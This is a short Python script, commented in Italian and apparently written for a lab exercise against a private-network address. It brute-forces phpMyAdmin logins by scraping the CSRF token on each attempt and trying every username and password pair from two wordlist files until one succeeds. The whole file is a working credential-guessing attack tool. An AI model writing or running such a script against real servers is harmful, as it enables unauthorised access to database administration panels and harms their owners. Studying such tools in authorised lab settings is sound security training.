import requests
from requests.exceptions import RequestException
from bs4 import BeautifulSoup

# Funzione per prelevare il "token"
def get_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    valore_token = soup.find('input', {'name': 'token'})['value']
    return valore_token

# Funzione per fare il brute force login in MyPhpAdmin
def brute_force_login(session, url, username, password, token):
    # Dati di login
    login_data = {
        'pma_username': username,
        'pma_password': password,
        'server': '1',
        'token': token,
    }
    
    try:
        # Effettua una richiesta usando la stessa sessione
        response = session.post(url, data=login_data, allow_redirects=True)

        # Verifica se la risposta contiene un messaggio di successo
        if f"navigation.php?token={token}" in response.text:
            # Stampa un messaggio se il login è riuscito
            print("Login riuscito con:", username, " - ", password)
            # Restituisce True per indicare un login riuscito
            return True
        else:
            # Stampa un messaggio se il login non è riuscito
            print("Login non riuscito con:", username, " - ", password)
            # Restituisce False per indicare un login non riuscito
            return False

    except RequestException as e:
        # Stampa un messaggio se c'è un errore durante il brute force login
        print(f"Errore durante la richiesta di login a {url}: {e}")

# Parte del codice che si esegue solo se questo script è il principale
if __name__ == "__main__":
    # Creazione di una sessione
    session = requests.Session()

    # Chiamata alla funzione di get_token usando la stessa sessione
    myphp_url_brute = "http://192.168.50.101/phpMyAdmin/index.php"
    

    with open('username.txt', 'r') as user_file:
        for username in user_file:
            username = username.strip()

            with open('password.txt', 'r') as password_file:
                for password in password_file:
                    token = get_token(session, myphp_url_brute)
                    password = password.strip()
                    # Esegue il brute force login e termina il programma se il login è riuscito
                    risultato = brute_force_login(session, myphp_url_brute, username, password, token)
                    if risultato:
                        exit()

    # Chiude la sessione dopo aver completato tutte le richieste
    session.close()
